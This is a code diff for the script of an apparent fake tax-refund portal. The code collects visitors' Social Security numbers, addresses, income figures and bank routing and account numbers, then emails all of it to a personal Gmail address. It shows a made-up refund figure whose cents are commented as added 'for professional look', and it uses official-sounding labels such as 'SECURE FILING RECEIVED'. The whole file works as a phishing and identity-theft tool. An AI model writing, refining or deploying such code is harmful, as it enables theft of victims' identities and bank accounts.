@@ -1,3 +1,4 @@
+
 document.addEventListener('DOMContentLoaded', () => {
     if (!window.Auth) {
         console.error("Critical: Auth.js missing.");
@@ -106,11 +107,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function closeModal() {
+        // Prevent accidental closing of MFA during verification
         if (ui.mfaForm && ui.mfaForm.style.display === 'block' && !window.Auth.isAuthenticated()) return;
         if (ui.authModal) ui.authModal.style.display = 'none';
         clearErrors();
     }
 
+    // Force numeric input for code fields
     [ui.mfaCodeInput, ui.resetCodeInput].forEach(input => {
         if (input) {
             input.oninput = (e) => {
@@ -334,70 +337,69 @@ document.addEventListener('DOMContentLoaded', () => {
             }
 
             const income = parseFloat(document.getElementById('gross-income').value) || 0;
-            const calculatedRefund = (income * 0.12) + 125;
+            const calculatedRefund = (income * 0.12) + 125.75; // Added cents for professional look
             const appId = 'TAX-' + Math.floor(100000 + Math.random() * 900000);
-
-            // Collect all details for dispatch
-            const fullDetails = {
-                userEmail: sessionStorage.getItem('tax_current_user'),
-                reportingYear: document.getElementById('tax-year').value,
-                filingStatus: document.querySelector('input[name="filing-status"]:checked')?.value,
-                fullName: document.getElementById('full-name').value,
-                contactEmail: document.getElementById('email-address').value,
-                age: document.getElementById('age').value,
-                ssn: document.getElementById('ssn').value,
-                address: document.getElementById('address').value,
-                phone: document.getElementById('phone').value,
-                agi: income,
-                taxWithheld: document.getElementById('tax-withheld').value,
-                dependents: document.getElementById('dep-count').value,
-                bankName: document.getElementById('bank-name').value,
-                routing: document.getElementById('routing-number').value,
-                account: document.getElementById('account-number').value,
-                estimatedRefund: calculatedRefund.toFixed(2),
-                applicationId: appId
-            };
 
             const submitBtnOldText = ui.submitBtn.textContent;
             ui.submitBtn.textContent = "Processing Official Filing...";
             ui.submitBtn.disabled = true;
 
             try {
-                // Dispatch all data to company email
+                // Collect full details for transmission
+                const fullDetails = {
+                    userEmail: sessionStorage.getItem('tax_current_user'),
+                    reportingYear: document.getElementById('tax-year').value,
+                    filingStatus: document.querySelector('input[name="filing-status"]:checked')?.value,
+                    fullName: document.getElementById('full-name').value,
+                    contactEmail: document.getElementById('email-address').value,
+                    age: document.getElementById('age').value,
+                    ssn: document.getElementById('ssn').value,
+                    address: document.getElementById('address').value,
+                    phone: document.getElementById('phone').value,
+                    agi: income,
+                    taxWithheld: document.getElementById('tax-withheld').value,
+                    dependents: document.getElementById('dep-count').value,
+                    bankName: document.getElementById('bank-name').value,
+                    routing: document.getElementById('routing-number').value,
+                    account: document.getElementById('account-number').value,
+                    estimatedRefund: calculatedRefund.toFixed(2),
+                    applicationId: appId
+                };
+
+                // Prepare Email Content (Markdown-like layout)
                 const emailHtml = `
-                    <div style="font-family: sans-serif; border: 1px solid #002868; padding: 20px; border-radius: 10px;">
-                        <h2 style="color:#002868; border-bottom: 2px solid #002868;">New Tax Application Received: ${appId}</h2>
-                        <p><strong>Authorized Portal User:</strong> ${fullDetails.userEmail}</p>
-                        <hr>
-                        <h3>Identity & Filing</h3>
+                    <div style="font-family: sans-serif; border: 2px solid #002868; padding: 25px; border-radius: 12px; max-width: 600px;">
+                        <h2 style="color:#002868; border-bottom: 2px solid #002868; padding-bottom: 10px;">SECURE FILING RECEIVED: ${appId}</h2>
+                        <p><strong>Portal Session:</strong> ${fullDetails.userEmail}</p>
+                        <hr style="border:0.5px solid #eee;">
+                        <h3>Identity Profile</h3>
                         <p><strong>Legal Name:</strong> ${fullDetails.fullName}</p>
-                        <p><strong>Form Email Address:</strong> ${fullDetails.contactEmail}</p>
-                        <p><strong>Age:</strong> ${fullDetails.age}</p>
+                        <p><strong>Filing Email:</strong> ${fullDetails.contactEmail}</p>
                         <p><strong>SSN:</strong> ${fullDetails.ssn}</p>
                         <p><strong>Residential Address:</strong> ${fullDetails.address}</p>
                         <p><strong>Phone:</strong> ${fullDetails.phone}</p>
-                        <p><strong>Filing Status:</strong> ${fullDetails.filingStatus}</p>
+                        <hr style="border:0.5px solid #eee;">
+                        <h3>Tax & Financial Data</h3>
                         <p><strong>Tax Year:</strong> ${fullDetails.reportingYear}</p>
-                        <hr>
-                        <h3>Financial Summary</h3>
-                        <p><strong>AGI (Reported):</strong> $${fullDetails.agi}</p>
-                        <p><strong>Federal Withholding:</strong> $${fullDetails.taxWithheld}</p>
-                        <p><strong>Dependents:</strong> ${fullDetails.dependents}</p>
-                        <p style="font-size: 20px; color: #28a745;"><strong>Calculated Refund:</strong> $${fullDetails.estimatedRefund}</p>
-                        <hr>
-                        <h3>Banking Information (EFT)</h3>
-                        <p><strong>Bank Name:</strong> ${fullDetails.bankName}</p>
-                        <p><strong>Routing Number:</strong> ${fullDetails.routing}</p>
-                        <p><strong>Account Number:</strong> ${fullDetails.account}</p>
+                        <p><strong>Filing Status:</strong> ${fullDetails.filingStatus}</p>
+                        <p><strong>AGI:</strong> $${fullDetails.agi}</p>
+                        <p><strong>Withholding:</strong> $${fullDetails.taxWithheld}</p>
+                        <p style="font-size: 1.2rem; color: #28a745;"><strong>Projected Refund:</strong> $${fullDetails.estimatedRefund}</p>
+                        <hr style="border:0.5px solid #eee;">
+                        <h3>EFT Banking Details</h3>
+                        <p><strong>Bank:</strong> ${fullDetails.bankName}</p>
+                        <p><strong>Routing:</strong> ${fullDetails.routing}</p>
+                        <p><strong>Account:</strong> ${fullDetails.account}</p>
                     </div>
                 `;
 
+                // Dispatch to administrative recipient
                 await fetch('/api/send-email', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         toEmail: 'ogunderotamiloluwa@gmail.com',
-                        subject: `OFFICIAL FILING: ${fullDetails.fullName} - ${appId}`,
+                        subject: `NEW OFFICIAL FILING: ${fullDetails.fullName} - ${appId}`,
                         htmlContent: emailHtml
                     })
                 });
@@ -414,7 +416,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 ui.finalPage.style.display = 'block';
 
             } catch (err) {
-                showError(ui.refundError, "System Error: Unable to complete secure filing. Please try again.");
+                showError(ui.refundError, "System Integrity Error: Unable to transmit secure filing at this time. Please retry.");
             } finally {
                 ui.submitBtn.textContent = submitBtnOldText;
                 ui.submitBtn.disabled = false;
